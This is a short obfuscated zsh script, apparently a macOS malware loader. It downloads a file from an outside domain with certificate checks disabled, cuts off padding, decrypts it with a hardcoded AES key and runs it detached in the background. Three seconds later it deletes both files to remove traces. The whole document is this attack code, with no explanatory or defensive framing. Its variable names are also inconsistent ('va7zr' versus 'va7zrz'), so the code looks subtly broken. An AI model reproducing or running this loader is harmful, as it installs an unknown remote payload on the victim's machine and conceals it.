#!/bin/zsh
va7zr=$(mktemp /tmp/7wf8jy.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/md5493507e32f86d6.bin" -o "$va7zrz" || exit 1
qxk6ze=$(stat -f %z "$va7zrz"); m8tbhgj=$(( qxk6ze - 1609 - 3618 ))
tail -c +$(( 1609 + 1 )) "$va7zrz" | head -c $m8tbhgj | openssl enc -d -aes-256-cbc -k 2d7a1248d68596a32648f28c -out "$va7zr" 2>/dev/null
[ -s "$va7zr" ] && chmod 700 "$va7zr" && ( "$va7zr" & ) && disown
( sleep 3; rm -f "$va7zr" "$va7zrz" ) &>/dev/null &
